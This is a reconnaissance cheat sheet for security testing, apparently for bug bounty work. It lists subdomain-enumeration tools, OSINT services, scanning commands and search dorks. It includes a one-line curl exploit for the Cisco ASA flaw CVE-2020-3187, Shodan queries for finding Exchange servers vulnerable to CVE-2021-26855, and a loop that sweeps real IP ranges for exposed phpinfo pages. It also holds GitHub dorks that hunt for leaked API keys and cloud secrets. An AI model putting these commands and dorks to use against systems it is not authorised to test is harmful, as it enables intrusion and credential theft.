
██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
                                           
           @intx0x80                              

1- Assest discover
	[+] subdomain
		https://github.com/anshumanbh/brutesubs
		https://michenriksen.com/blog/aquatone-now-in-go/
		https://github.com/mandatoryprogrammer/cloudflare_enum
		https://github.com/TheRook/subbrute
		https://github.com/blechschmidt/massdns
		https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056 (wordlist DNS)
		https://github.com/jhaddix/domain
		knockpy
		https://github.com/tomnomnom/assetfinder
		https://bgp.he.net
		CSP Headers [https://github.com/0xbharath/domains-from-csp]
		https://github.com/0xbharath/censys-enumeration
		https://github.com/appsecco/the-art-of-subdomain-enumeration
		https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration
		https://github.com/0xbharath/assets-from-spf
		https://github.com/0xbharath/cloudflare_enum
		massdns
		amass 
		subfinder 
		Altdns
		sublister
		crt.sh (%.site.com)
		www.yougetsignal.com
	[+] CERT
		censys [443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:[site.com] ]
		443.https.tls.certificate.parsed.subject.common_name:site.com
		google [https://transparencyreport.google.com/https/certificates?hl=en]
		facebook [https://developers.facebook.com/tools/ct]


2-OSINT
	https://github.com/intrigueio/intrigue-core

	[+] ARIN
		https://whois.arin.net
		https://reverse.report/
		http://domainbigdata.com/
		http://viewdns.info/
		https://apps.db.ripe.net/db-web-ui/#/fulltextsearch
		http://bgp.he.net
		[+] Shodan [shodan.io]
			Ports: 8443, 8080, 8180, etc
			Title: “Dashboard [Jenkins]”
			Product:Tomcat
			Hostname: somecorp.com
			Org: evilcorp
			ssl: Google

		https://publicwww.com/
		https://hunter.io/
		https://www.zoomeye.org/
		https://greynoise.io/
		https://shodan.io/
		https://censys.io/
		https://searchcode.com
		fofa.so
	[+] doc 
		stroage.googleapis.com/site.com
	[+] Acquisitions 
		https://www.crunchbase.com/search/acquisitions
	[+]get live domains [https://github.com/tomnomnom/httprobe]
3-Vendor Services
	[+] Leak creeds
			https://apkscan.nviso.be
		gitrob
		git-all-secrets
		truffleHog
		git-secrets
		repo-supervisor
		[+]gitlab
			gitlab /explore 
		[+] github dork	
				https://github.com/0xbharath/github-dorks
				"company.com" "dev"
				"dev.company.com”
				"company.com" API_key
				"company.com" password
				"api.company.com" authorization
				APP_SECRET
				consumerkey
				JIRA_Password
				jdbc
				“authorization bearer”
				auth_key
				consumer_secret
				SECURITY-SIGNATURE
				X-API
				X-Paypal
				secret_key
				JWK/JWT
				SSO_LOGIN
				defaultEndpointsProtocol
				access_key
				accountKey
				AWS_Secret
				aws_secret_access_key
				rexis
				api_key


#CVE-2020-3187 

/+CSCOE+/session_password.html


Shodan Dork For CVE-2021-26855

1.title:"Outlook Web App"
2."Set-Cookie: ClientId="

title:"Outlook Web App" hostname:http://target.com
http.favicon.hash:1768726119


#POC

POC:
curl -H "Cookie: token=../+CSCOU+/csco_logo.gif" https://target/+CSCOE+/session_password.html


3-Visual Identification
	eyewitness
	webscreenshot
	gowitness


4-scanning
	[+]nmap
		nmap -sS -A -PN -p- --script=http-title site.com
		[+]common ports
			3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,7447,7080,8880,8983,5673,7443
	[+]masscan 
		masscan -p1-65535 $(dig +short $1|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head - --max-rate 1000 


5-Platform Identification
	[*]Builtwith
	[*]Wappalyzer
	[*]Vulners Burp Plugin
6-Content Discovery
	[*]Gobuster
	[*]dirbuster
	[*]dirsearch
	[*]wfuzz
	[*]meg [https://github.com/tomnomnom/meg]
	[*]waybackurls [https://github.com/tomnomnom/waybackurls]
	[+]SVN
	https://github.com/cure53/Flashbang
		[+]git 
			https://github.com/arthaud/git-dumper.git
			https://github.com/michenriksen/gitrob

7-Parameter discovery
	Parameth [https://github.com/maK-/parameth]
	Arjun    [https://github.com/s0md3v/Arjun]


8-scripts
	[+]phpinfo
			#!/bin/bash
			for ipa in 98.13{6..9}.{0..255}.{0..255}; do
			wget -t 1 -T 5 http://${ipa}/phpinfo.php; done&
	[+]certspotter
		curl https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq
	[+]crtsh
		curl -s https://crt.sh/?q=%.$1  | sed 's/<\/\?[^>]\+>//g' | grep $1

		#!/bin/bash

		echo "[+] Start gather subdomain "
		for i in `cat list.txt`
		do
		curl -s https://crt.sh/\?q\=$i\&output\=json | jq -r '.[].name_value'|sed 's/\*\.//g'|sort -u |tee -a domains.txt
		done
		echo "[+] httprope "
		cat domains.txt |httprobe|tee live-domain.txt
		echo "[+] End "

9-AWS SS3
	sandcastle [https://github.com/0xSearches/sandcastle]
	https://github.com/nahamsec/lazys3
	[+]dork
		site:s3.amazonaws.com inurl:site

10-Dorks
	    -site.com +inurl:dev -cdn
	    site:documenter.getpostman.com yahoo.com
	    site:getpostman.com yahoo data
		- site:site.com -www.site.com -www.sanbox
		- site:target.com filetype:php
		- site:target.com filetype:aspx
		- site:target.com filetype:swf (Shockwave Flash)
		- site:target.com filetype:wsdl
		- site: target.com inurl:.php?id=
		- site: target.com inurl:.php?user=
		- site: target.com inurl:.php?book=
		- site: target.com inurl:login.php
		- site: target.com intext: “login”
		- site: target.com inurl:portal.php
		- site: target.com inurl:register.php
		- site: target.com intext: “index of /”
		- site: target.com filetype:txt
		- site: target.com inurl:.php.txt
		- site: target.com ext:txt
		- site:trello.com intext:ftp
		- site:trello.com intext:ORG
		- site:target.com filetype:php
		- site:target.com filetype:aspx
		- site:target.com filetype:swf (Shockwave Flash)
		- site:target.com filetype:wsdl
		- site:example.com -www [ Bing, DuckDuckGo, Yahoo]
		- site:http://jfrog.io inurl:yourtarget









										███████╗███╗   ██╗██████╗ 
										██╔════╝████╗  ██║██╔══██╗
										█████╗  ██╔██╗ ██║██║  ██║
										██╔══╝  ██║╚██╗██║██║  ██║
										███████╗██║ ╚████║██████╔╝
										╚══════╝╚═╝  ╚═══╝╚═════╝ 
										                          
